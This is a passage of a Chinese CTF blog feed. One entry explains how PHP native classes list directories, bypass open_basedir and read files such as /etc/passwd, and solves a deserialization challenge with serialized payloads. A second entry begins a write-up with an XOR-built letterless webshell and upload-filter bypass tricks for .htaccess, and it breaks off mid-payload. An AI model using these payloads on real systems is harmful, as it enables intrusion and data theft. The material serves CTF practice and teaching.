class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator extends SplFileInfo implements SeekableIterator &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> __construct ( string $path )</span><br><span class="line">    <span class="keyword">public</span> current ( ) : DirectoryIterator</span><br><span class="line">    <span class="keyword">public</span> getATime ( ) : int</span><br><span class="line">    <span class="keyword">public</span> getBasename ( string $suffix = ? ) : string</span><br><span class="line">    <span class="keyword">public</span> getCTime ( ) : int</span><br><span class="line">    <span class="keyword">public</span> getExtension ( ) : string</span><br><span class="line">    <span class="keyword">public</span> getFilename ( ) : string</span><br><span class="line">    <span class="keyword">public</span> getGroup ( ) : int</span><br><span class="line">    <span class="keyword">public</span> getInode ( ) : int</span><br><span class="line">    <span class="keyword">public</span> getMTime ( ) : int</span><br><span class="line">    <span class="keyword">public</span> getOwner ( ) : int</span><br><span class="line">    <span class="keyword">public</span> getPath ( ) : string</span><br><span class="line">    <span class="keyword">public</span> getPathname ( ) : string</span><br><span class="line">    <span class="keyword">public</span> getPerms ( ) : int</span><br><span class="line">    <span class="keyword">public</span> getSize ( ) : int</span><br><span class="line">    <span class="keyword">public</span> getType ( ) : string</span><br><span class="line">    <span class="keyword">public</span> isDir ( ) : bool</span><br><span class="line">    <span class="keyword">public</span> isDot ( ) : bool</span><br><span class="line">    <span class="keyword">public</span> isExecutable ( ) : bool</span><br><span class="line">    <span class="keyword">public</span> isFile ( ) : bool</span><br><span class="line">    <span class="keyword">public</span> isLink ( ) : bool</span><br><span class="line">    <span class="keyword">public</span> isReadable ( ) : bool</span><br><span class="line">    <span class="keyword">public</span> isWritable ( ) : bool</span><br><span class="line">    <span class="keyword">public</span> key ( ) : string</span><br><span class="line">    <span class="keyword">public</span> next ( ) : void</span><br><span class="line">    <span class="keyword">public</span> rewind ( ) : void</span><br><span class="line">    <span class="keyword">public</span> seek ( int $position ) : void</span><br><span class="line">    <span class="keyword">public</span> __toString ( ) : string    <span class="comment">// 以字符串形式获取文件名</span></span><br><span class="line">    <span class="keyword">public</span> valid ( ) : bool</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用 DirectoryIterator 类遍历指定目录里的文件：</p><p>如果我们这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir=<span class="keyword">new</span> DirectoryIterator(<span class="string">"/"</span>);</span><br><span class="line"><span class="keyword">echo</span> $dir;</span><br></pre></td></tr></table></figure><p>会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名： </p><p>也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：</p><p>glob:// 协议用来查找匹配的文件路径模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*flag*"</span>);</span><br><span class="line"><span class="keyword">echo</span> $dir;</span><br></pre></td></tr></table></figure><p>如果想输出全部的文件名我们还需要对$dir对象进行遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir=<span class="keyword">new</span> DirectoryIterator(<span class="string">"/"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($dir <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f.<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().'&lt;br&gt;');</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>FilesystemIterator 类</strong>   </p><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p><p>该类的使用方法与DirectoryIterator 类也是基本相同的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir=<span class="keyword">new</span> FilesystemIterator(<span class="string">"/"</span>);</span><br><span class="line"><span class="keyword">echo</span> $dir;</span><br></pre></td></tr></table></figure><p><strong>GlobIterator 类</strong></p><p>与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。</p><p>类摘要：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GlobIterator extends FilesystemIterator implements SeekableIterator , Countable &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> __construct ( string $pattern , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO )</span><br><span class="line">    <span class="keyword">public</span> count ( ) : int</span><br><span class="line">    <span class="comment">/* 继承的方法 */</span></span><br><span class="line">    <span class="keyword">public</span> FilesystemIterator::__construct ( string $path , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS )</span><br><span class="line">    <span class="keyword">public</span> FilesystemIterator::current ( ) : mixed</span><br><span class="line">    <span class="keyword">public</span> FilesystemIterator::getFlags ( ) : int</span><br><span class="line">    <span class="keyword">public</span> FilesystemIterator::key ( ) : string</span><br><span class="line">    <span class="keyword">public</span> FilesystemIterator::next ( ) : void</span><br><span class="line">    <span class="keyword">public</span> FilesystemIterator::rewind ( ) : void</span><br><span class="line">    <span class="keyword">public</span> FilesystemIterator::setFlags ( int $flags = ? ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir=<span class="keyword">new</span> DirectoryIterator(<span class="string">"/"</span>);</span><br><span class="line"><span class="keyword">echo</span> $dir;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir=<span class="keyword">new</span> FilesystemIterator(<span class="string">"/"</span>);</span><br><span class="line"><span class="keyword">echo</span> $dir;</span><br></pre></td></tr></table></figure><p>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 <code>__toString()</code> 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 <code>GlobIterator(/*flag*)</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir=<span class="keyword">new</span> GlobIterator(<span class="string">"/*flag*"</span>);</span><br><span class="line"><span class="keyword">echo</span> $dir;</span><br></pre></td></tr></table></figure><p><strong>使用可遍历目录类绕过 open_basedir</strong> </p><p>使用 DirectoryIterator 类或 FilesystemIterator 类<br>DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = $_GET[<span class="string">'whoami'</span>];</span><br><span class="line">$a = <span class="keyword">new</span> DirectoryIterator($dir);</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line">$a = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);&#125;</span><br></pre></td></tr></table></figure><p>我们输入 /?whoami=glob:///* 即可列出根目录下的所有文件</p><p>使用 GlobIterator 类<br>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = $_GET[<span class="string">'whoami'</span>];</span><br><span class="line">$a = <span class="keyword">new</span> GlobIterator($dir);</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line">$a = <span class="keyword">new</span> FilesystemIterator(<span class="string">"/*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="可读取文件类"><a href="#可读取文件类" class="headerlink" title="可读取文件类"></a>可读取文件类</h2><p>目前发现的可读取文件类有：</p><p>SplFileObject 类</p><p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：<a href="https://www.php.net/manual/zh/class.splfileobject.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/class.splfileobject.php</a></p><p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p><p>我们可以像类似下面这样去读取一个文件的一行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$context = <span class="keyword">new</span> SplFileObject(<span class="string">'/etc/passwd'</span>);</span><br><span class="line"><span class="keyword">echo</span> $context;</span><br></pre></td></tr></table></figure><p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$context = <span class="keyword">new</span> SplFileObject(<span class="string">'/etc/passwd'</span>);</span><br><span class="line"><span class="keyword">foreach</span>($context <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2021-MAR-DASCTF-明御攻防赛-ez-serialize"><a href="#2021-MAR-DASCTF-明御攻防赛-ez-serialize" class="headerlink" title="[2021 MAR DASCTF 明御攻防赛]ez_serialize"></a>[2021 MAR DASCTF 明御攻防赛]ez_serialize</h2><p>进入题目，给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">"B"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">"ctfer"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span>    // 可以直接绕过<span class="title">__wakeup</span><span class="params">()</span>方法的执行</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'bad hacker~'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"hello "</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span><span class="params">($code)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在A类中可以动态拼接类，就像PHP动态执行函数一样。但是题目给出的A、B、C三个类但是都没有什么危险函数，应该是没有利用的点，想到应该是原生类的利用。我们可以利用上面说的那几个文件处理的原生去读文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">'FilesystemIterator'</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator("/var/www/html")</span></span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">"/var/www/html/"</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$poc  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($poc);</span><br></pre></td></tr></table></figure><p>得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">"class"</span>;s:<span class="number">18</span>:<span class="string">"FilesystemIterator"</span>;s:<span class="number">4</span>:<span class="string">"para"</span>;s:<span class="number">14</span>:<span class="string">"/var/www/html/"</span>;s:<span class="number">5</span>:<span class="string">"check"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE,并在这个文件夹中找到了flag.php.</p><p>然后我们使用 SplFileObject 类读取flag.php就行了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">'SplFileObject'</span>;    </span><br><span class="line">    <span class="comment">// SplFileObject("/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php")</span></span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$poc  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($poc);</span><br></pre></td></tr></table></figure><p>参考文章：<br>PHP 原生类在 CTF 中的利用： <a href="https://www.anquanke.com/post/id/238482" target="_blank" rel="noopener">https://www.anquanke.com/post/id/238482</a>   </p><p>从几道CTF题看SOAP安全问题: <a href="https://www.anquanke.com/post/id/153065" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php原生类利用&lt;/p&gt;
&lt;p&gt;转载 &lt;a href=&quot;https://www.anquanke.com/post/id/238482&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/238482&lt;/a&gt;     &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题二</title>
    <link href="https://blog.cfyqy.com/article/1ca7c18f.html"/>
    <id>https://blog.cfyqy.com/article/1ca7c18f.html</id>
    <published>2021-05-05T15:44:56.000Z</published>
    <updated>2021-06-29T10:32:31.291Z</updated>
    
    <content type="html"><![CDATA[<p>无感情的刷题机器</p><a id="more"></a><h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh &#x3D; @$_GET[&#39;_&#39;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&#39;One inch long, one inch strong!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&#39;&#x2F;[\x00- 0-9A-Za-z\&#39;&quot;\&#96;~_&amp;.,|&#x3D;[\x7F]+&#x2F;i&#39;, $hhh) )</span><br><span class="line">    die(&#39;Try something else!&#39;);</span><br><span class="line"></span><br><span class="line">$character_type &#x3D; count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>考点一：</p><p>构造不包含数字和字母的webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$l = <span class="string">""</span>;</span><br><span class="line">$r = <span class="string">""</span>;</span><br><span class="line">$argv = str_split(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($argv);$i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = chr($j)^chr(<span class="number">255</span>);      \\dechex(<span class="number">255</span>) = ff</span><br><span class="line">        <span class="keyword">if</span>($k == $argv[$i])&#123;</span><br><span class="line">        <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">        $l .= <span class="string">"%ff"</span>;</span><br><span class="line">                $r .= <span class="string">"%0"</span> . dechex($j);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            $l .= <span class="string">"%ff"</span>;</span><br><span class="line">            $r .= <span class="string">"%"</span> . dechex($j);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\&#123;$l`$r\&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的话我们异或只能构造GET型，POST不行</p><p>然后配合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>，可以执行一些函数。</p><p>考点二：  </p><p>参考链接<br><a href="https://www.dazhuanlan.com/2019/12/17/5df803f62c08a/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/12/17/5df803f62c08a/</a></p><p>nginx的服务器，而且上传目录下有一个php文件，所以上窜.user.ini<br>apache的服务器，应该上传.htaccess<br>两个要注意的点是:</p><p>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure><p>在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>x00x00x8ax39x8ax39 是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess<br>这里的php是7.2的版本，无法使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>来绕过对&lt;?的检测<br>ps:<br>可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass<br>我们这里的解决方法是将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码,比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php 